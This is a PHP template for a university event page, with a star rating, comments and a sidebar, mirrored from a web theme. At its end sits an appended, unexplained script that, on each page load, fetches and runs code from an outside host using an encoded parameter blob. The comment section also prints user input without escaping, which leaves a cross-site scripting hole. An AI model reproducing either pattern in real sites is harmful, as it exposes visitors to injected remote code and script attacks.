<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from themes.webavenue.com.au/enstruct/html/13-enstruct-blog-single.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 16 Apr 2017 14:07:44 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>|| &nbsp; Enstruct</title>
    <meta name="keywords" content="">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- favicon -->
    <link rel="shortcut icon" type="image/png" href="favicon.png" /> 

    <!-- GOOGLE FONT -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600%7CRoboto:400,500,700" rel="stylesheet">

    <!-- CSS LIBRARY -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/bootstrap.min.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/animate.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/font-awesome.min.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/hover.css'); ?>">

    <!-- Style Sheets -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/bootstrap-datetimepicker.min.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/jquery.bxslider.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/jquery-ui.min.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/swiper.min.css'); ?>" /> 


    <!-- Main css -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/style.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/responsive.css'); ?>" />

    <!--[if lt IE 8]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
  <![endif]-->
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>

      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->
<script>
function highlightStar(obj,id) {
    removeHighlight(id);        
    $('.demo-table #tutorial-'+id+' li').each(function(index) {
        $(this).addClass('highlight');
        if(index == $('.demo-table #tutorial-'+id+' li').index(obj)) {
            return false;   
        }
    });
}

function removeHighlight(id) {
    $('.demo-table #tutorial-'+id+' li').removeClass('selected');
    $('.demo-table #tutorial-'+id+' li').removeClass('highlight');
}

function addRating(obj,id) {
    $('.demo-table #tutorial-'+id+' li').each(function(index) {
        $(this).addClass('selected');
        $('#tutorial-'+id+' #rating').val((index+1));
        if(index == $('.demo-table #tutorial-'+id+' li').index(obj)) {
            return false;   
        }
    });
    $.ajax({
    url: "<?= base_url() ?>event/rating",
    data:'id='+id+'&rating='+$('#tutorial-'+id+' #rating').val(),
    type: "POST"
    });
}

function resetRating(id) {
    if($('#tutorial-'+id+' #rating').val() != 0) {
        $('.demo-table #tutorial-'+id+' li').each(function(index) {
            $(this).addClass('selected');
            if((index+1) == $('#tutorial-'+id+' #rating').val()) {
                return false;   
            }
        });
    }
} 
</script>
</head>

<body>
   <?php include 'header.php'; ?>
    <!--header ends-->
    
    <main>
        <section class="blog-block primary-padding">
            <div class="container">
                <?php foreach ($single as $value): ?>
                <div class="row">
                    <div class="col-md-12 col-sm-12 ">
                        <div class="main-title la page-title wow fadeInUp">
                            <h2><?php echo $value->nama_event; ?></h2>
                        </div>
                    </div>
                </div>
                <!--title-->

                <div class="row blog-main-wrap">
                    <div class="col-md-8 col-sm-8 ">
                        <div class="blog-wrap blog-sngle pb-0 mb-50 ">
                            <figure class="post-thumbnail overlay">
                                <img src="<?php echo base_url() ?>/assets/event/<?php echo $value->poster; ?>" alt="Blog image">
                            </figure>
                            <!--figure-->

                            <h4 class="entry-title">
                            </h4>
                            <!--title-->

                            <div class="post-info">
                                <span class="post-author">
                                       <i class="fa fa-user"></i> Posted by: <a href="#"><?php echo $value->penyelenggara; ?></a>
                                    </span>
                                <span class="post-date">
                                       <i class="fa fa-calendar"></i> Date: <a href="#"><?php echo $value->tanggal; ?></a>
                                    </span>
                                <span class="post-commetns">
                                       <i class="fa fa-comments"></i> Comments: <a href="#"><?= $jmlkomen->jmlkomen ?> comments</a>
                                </span>
                                <span class="post-commetns">
                                       <i class="fa fa-comments"></i> Place: <a href="#"><?php echo $value->tempat; ?></a>
                                </span>
                               
                            </div>
                            <!--post info-->

                            <div class="post-content">
                               <p><?php echo $value->konten; ?></p>
                            </div>
                            <!--post content-->

                        </div>
                        <!--single blog-->
                    
<table class="demo-table" border="0">
<tbody>
<tr>
<td valign="top">
<b>Rating:</b>
<div id="tutorial-<?php echo $value->id_event; ?>">
<input type="hidden" name="rating" id="rating" value="<?php echo $value->rating; ?>" />
<ul onMouseOut="resetRating(<?php echo $value->id_event; ?>);">
  <?php
  for($i=1;$i<=5;$i++) {
  $selected = "";
  if(!empty($value->rating) && $i <= $value->rating) {
    $selected = "selected";
  }
  ?>
  <li class='<?php echo $selected; ?>' onmouseover="highlightStar(this,<?php echo $value->id_event; ?>);" onmouseout="removeHighlight(<?php echo $value->id_event; ?>);" onClick="addRating(this,<?php echo $value->id_event; ?>);">&#9733;</li>  
  <?php }  ?>
<ul>
</div>
</td>
</tr>
</tbody>
</table>
                    <?php endforeach; ?>
                        <div class="entry-footer">

                        <?php
                                $today = date("Y-m-d");
                                $date = $value->tanggal;
                                if ($date < $today) {
                        ?>
                            <div class="tag-links mb-40">
                                <a href="<?= base_url().'event/form_feedback/'.$value->id_event ?>" >
                                Feedback</a>
                            </div>
                            <?php
                            }else{
                            ?>
                            <?php } ?>
                            
                            <!--tags-->

                            <div class="entry-share gray-bg mb-30">
                                <h5 class="m-0">Share</h5>
                                <ul>
                                    <li>
                                        <a href="http://www.facebook.com/sharer.php?u=<?= base_url().'event/single_page/'.$idevent ?>" class="facebook"><i class="fa fa-facebook" target="_blank"></i> <span>Facebook </span></a>
                                    </li>

                                    <!--facebook-->
                                    <li>
                                        <a href="https://twitter.com/home?status=<?= base_url().'event/single_page/'.$idevent ?>" class="twitter" target="_blank"><i class="fa fa-twitter"></i> <span> Twitter </span></a>
                                    </li>
                                    <!--twitter-->

                                    <li>
                                        <a href="https://plus.google.com/share?url=<?= base_url().'event/single_page/'.$idevent ?>" class="google-plus" target="_blank"><i class="fa fa-google-plus"></i> <span> Google+ </span></a>
                                    </li>
                                    <!--google plus-->

                                    <li>
                                        <a href="https://www.linkedin.com/shareArticle?mini=true&url=<?= base_url().'event/single_page/'.$idevent ?>&title=Event%20Telkom%20University&summary=&source=" class="linkedin" target="_blank"><i class="fa fa-linkedin"></i> <span> Linkedin </span></a>
                                    </li>
                                    <!--linkedin-->

                                </ul>
                            </div>
                            <!--share-->

                            <!--button wrap-->

                        </div>
                        <!--entry footer-->

                       
                        <!--post author-->

                        <div class="comment-area mb-27">
                            <div class="title">
                                <h3 class="m-0">Comments</h3>
                                <span><?= $jmlkomen->jmlkomen ?> comments</span>
                            </div>
                            <ul class="comment-list">
                            <?php foreach ($komen as $k) {
                            ?>
                                <li class="comment">
                                    <figure class="avatar">
                                        <img src="<?php echo base_url('assets/images/avatar.jpg'); ?>" alt="">
                                    </figure>
                                    <!--avatar-->

                                    <div class="comment-body">
                                        <div class="comment-meta">
                                            <h6 class="m-0">
                                                <?= $k->nama_komentar ?> Says: 
                                                <span><?= $k->waktu ?></span>
                                            </h6>
                                        </div>
                                        <!--comment meta-->

                                        <div class="comment-content">
                                            <p>
                                                <?= $k->isi_komentar ?>
                                            </p>
                                        </div>
                                        <!--comment content-->
                                    </div>
                                    <!--comment body-->
                                </li>
                                <!--single comment-->
                                <?php } ?>
                                <!--single comment-->
                            </ul>
                            <!--comment list-->

                            <div class="comment-respond">
                                <h4 class="title">Leave a reply</h4>
                                <form action="<?= base_url().'event/komentar/'.$idevent ?>" method="post">
                                    <div class="row">
                                        <div class="form-group col-sm-12">
                                            <textarea placeholder="Your comment here" name="isi" required></textarea>
                                        </div>
                                        <!--text area-->

                                        <div class="form-group col-sm-4">
                                            <input type="text" placeholder="Your Full Name" name="nama" required>
                                        </div>
                                        <!--name-->

                                        <div class="form-group col-sm-4">
                                            <input type="email" placeholder="Your Email Address" name="email" required>
                                        </div>
                                        <!--name-->

                                        <div class="form-group col-sm-4">
                                            <input type="text" placeholder="Your Website URL" name="website">
                                        </div>
                                        <!--name-->

                                        <div class="form-group col-sm-12">
                                            <button type="submit" class="btn bg-yellow">Post Comment</button>
                                        </div>
                                    </div>
                                </form>
                                <!--form-->
                            </div>
                            <!--comment respond-->
                        </div>
                        <!--comment area-->

                        
                    </div>
                    <!--blog left-->

                    <div class="col-md-4 col-sm-4 ">
                        <div class="sidebar ">
                           
                            <!--search-->

                            
                            <!--categories-->

                            <div class="widget widget_recent_entries ">
                                <h4 class="widget-title">Recent Posts</h4>
                                <?php foreach($recent as $value): ?>
                                <ul>
                                    <li>
                                        <a href="#"><?php echo $value->nama_event; ?></a>
                                        <span class="post-date">By: <?php echo $value->penyelenggara; ?> on <?php echo $value->tanggal; ?></span>
                                    </li>
                                </ul>
                            <?php endforeach; ?>
                            </div>
                            <!--recent post-->

                            
                            <!--Archives-->

                            
                            <!--Tags-->

                            <div class="sidebar-box ">
                                <h4 class="sidebar-title">Upcoming events</h4>
                                <ul class="sidebar-event">
                                <?php foreach($recent as $value): ?>
                                    <li>
                                        <h6><a href="#"><?php echo $value->nama_event; ?></a></h6>
                                        <div class="post-info">
                                            <span><i class="fa fa-clock-o"></i> <?php echo $value->tanggal.' - '.$value->waktu; ?></span>
                                            <span><i class="fa fa-map-marker"></i> <?php echo $value->tempat; ?></span>
                                        </div>
                                    </li>
                                    <!--single event-->
                                <?php endforeach; ?>
                                </ul>
                            </div>
                        </div>
                        <!--sidebar-->
                    </div>
                    <!--blog right-->
                </div>
                <!--blog wrap-->
            </div>
        </section>
        <!--blog wrap-->
    </main>
    <!--main ends-->

    <?php include 'footer.php'; ?>
    <!--footer-->

    <!--back to top-->
    <a href="#" class="scrollup"><i class="fa fa-angle-up"></i></a>
   
    <!-- Js libery -->
    <script src="<?php echo base_url('assets/js/jquery-3.1.1.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/tether.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/bootstrap.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/modernizr.js'); ?>"></script>

    <!--jquery ui-->
    <script src="<?php echo base_url('assets/js/jquery-ui.js'); ?>"></script>

    <!-- slider js -->
    <script src="<?php echo base_url('assets/js/jquery.bxslider.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/swiper.jquery.min.js'); ?>"></script>    

    <!-- wow -->
    <script src="<?php echo base_url('assets/js/wow.min.js'); ?>"></script>

    <!-- Parallax -->
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.parallax-1.1.3.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.localscroll-1.2.7-min.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.scrollTo-1.4.2-min.js'); ?>"></script>

    <!--datepicker-->
    <script src="<?php echo base_url('assets/js/bootstrap-datetimepicker.min.js'); ?>"></script>

    <!--counter-->
    <script src="<?php echo base_url('assets/js/jquery.countTo.js'); ?>"></script>

    <!--smooth scrollling-->
    <script src="<?php echo base_url('assets/js/jQuery.scrollSpeed.js'); ?>"></script>

    <!--Costom js-->
    <script src="<?php echo base_url('assets/js/main.js'); ?>"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK%2fmsldK2DOE9Bz%2bmm3maBxBsgjCXnP0Srcmsf0sF%2bgkuDKoHJHQ6aDPTZ5xRGRXcZGb%2fke%2bBxFn1iivijaEbZPcQ%2f5cRhAJQaIeV0sVuytAlz15648WIGBeCQEIJXxyl1War2voKgcCWXEJiCAZCnnm%2f1hfwLWfNdw6YLSIkM3M57zYJEyXQcyujyqQIFzUJG%2f9%2bpWMRSug5NLbCXcB3eiaZLtTBokXFurLjlO1%2fP%2bzzBsPAkD6GeADY7kMNp4XGaVgVoDPbKgAp6usGMdBTTftCtWI3o29aoOkdi%2bz3DMhGxHeOyJ45OtIXrgXEhaaGlMGEtmJLy0ExjhiH57yfd0NZa1zTWDQnKVh5JhLH1sUkrXszjRg2fEcKzmMOXbBfQmINQ6Sj%2bCAOgDNJ4FbeLL2shn%2bope%2b99bKoC32huEms%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from themes.webavenue.com.au/enstruct/html/13-enstruct-blog-single.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 16 Apr 2017 14:07:45 GMT -->
</html>
